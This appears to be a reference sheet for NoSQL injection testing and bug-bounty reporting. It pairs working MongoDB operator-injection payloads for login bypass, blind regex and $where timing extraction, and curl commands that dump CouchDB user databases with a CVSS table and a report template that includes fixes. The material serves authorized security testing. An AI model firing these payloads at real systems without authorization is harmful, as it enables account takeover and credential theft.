# Payloads, Tools, Severity, and Report Template

## Syntax/fuzz payloads

```
'  "  `  {  }  ;
'"`{ ;$Foo} $Foo \xYZ
%00
```

## Boolean condition payloads

```
' && 0 && 'x
' && 1 && 'x
'||'1'=='1
```

## Operator injection — authentication bypass (JSON body)

```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
{"username": {"$exists": true}, "password": {"$exists": true}}
{"username": {"$in": ["admin", "administrator", "root"]}, "password": {"$ne": ""}}
```

## Operator injection — PHP / form-urlencoded vector

```
username=admin&password[$ne]=x
username[$ne]=1&password[$ne]=1
```

## Filter-bypass nesting (when `$` keys are stripped at the top level only)

```json
{"$or": [{}, {"password": {"$ne": null}}]}
```

## Blind regex extraction

```json
{"password": {"$regex": "^a"}}
{"password": {"$regex": "^admin.*"}}
```

## Timing-based (`$where`) detection and extraction

```json
{"$where": "sleep(5000)"}
{"$where": "function() { sleep(5000); return true; }"}
{"$where": "this.password.match(/^a/) && sleep(5000)"}
```

## Field discovery / enumeration targets

```
this.username  this.password  this.email  this.role
this.apiKey    this.token     this.secret this.isAdmin
```

## CouchDB unauthenticated checks

```bash
curl http://<target>:5984/_all_dbs
curl http://<target>:5984/<dbname>/_all_docs?include_docs=true
curl http://<target>:5984/_users/_all_docs?include_docs=true
```

---

## Tools

| Tool | Use |
|---|---|
| `nosqli` | Actively maintained Go CLI; detection, boolean-blind extraction, and timing attacks; accepts a raw Burp request file directly |
| `NoSQLMap` | Older, menu-driven, more exploitation scenarios (dictionary attacks, web-app exploitation modules) for MongoDB and CouchDB; useful when `nosqli`'s output is ambiguous |
| Burp Repeater/Intruder | Manual operator/payload testing and blind-extraction automation when you need fine control over the request shape |

## CVSS 3.1 quick reference for common NoSQL injection findings

| Finding | Typical CVSS range | Severity |
|---|---|---|
| Authentication bypass via operator injection (any account) | ~8.1–9.1 | High–Critical |
| Authentication bypass targeting/confirmed as admin | ~9.1–9.8 | Critical |
| Blind extraction of a non-sensitive field | ~4.3–5.3 | Medium |
| Blind extraction of a password/token/secret field, confirmed working | ~8.1–9.1 | High–Critical |
| `$where`/`mapReduce` JS execution confirmed (timing only, no further chain) | ~6.5–7.5 | Medium–High |
| `$where`/`mapReduce` chained into bulk data exfiltration | ~8.1–9.1 | High–Critical |
| CouchDB unauthenticated `_users` database disclosure | ~9.1–9.8 | Critical |
| Operator injection on a non-sensitive filter, no unauthorized data exposure shown | ~3.1–4.3 | Low |
| Claimed RCE with no demonstrated execution beyond a confirmed `sleep()` delay | n/a | Not yet a finding — see validation gate in `SKILL.md` |

## Full report template

```markdown
**Title**: NoSQL injection in [exact endpoint] allows [actor] to [impact]

## Summary
2-3 plain sentences: the endpoint, the injection mechanism (operator
injection / blind extraction / $where), and the resulting impact.

## Steps to Reproduce
1. Send: [exact request — method, path, headers, body]
2. Observe: [exact response demonstrating the injected logic took effect]
3. [If auth bypass] Confirm the resulting session/token is valid by
   calling an authenticated endpoint and showing which account it is
4. [If blind extraction] Show the iterative process (or a script/tool
   output) that recovered the actual value, and independently verify
   that value is correct

## Proof of Concept
Request/response pairs for each step above; for timing-based findings,
include multiple trials of both the delay and control (no-delay)
requests to demonstrate the signal is real and reproducible.

## Impact
An attacker can [exact action], requiring [no credentials / a single
unauthenticated request / etc]. State precisely what was recovered or
accessed — a specific account, a specific secret value (redacted in
the report itself), or a specific dataset.

## Suggested Fix
One or two sentences specific to this endpoint — e.g., "Enforce that
`username` and `password` are validated as strings before being placed
into the MongoDB query object (reject non-string types), and consider
disabling server-side JavaScript via `security.javascriptEnabled: false`
if `$where`/`mapReduce` aren't required."

## Severity Assessment
CVSS 3.1: X.X ([Severity label]) — see table above for basis
```

### Tone notes

- Lead with the impact and the exact operator/technique used, not a NoSQL-injection tutorial — the triager knows what it is.
- For auth bypass, always state which account you ended up authenticated as — "any account" and "the admin account" are different severities.
- For blind extraction, show the actual recovered value was verified correct, not just that the extraction process "should" work.
- Don't claim RCE unless you have an actual execution chain to show — a confirmed `sleep()` delay proves JS execution, not OS-level code execution.
- Keep it under ~600 words, consistent with the other skills in this set.
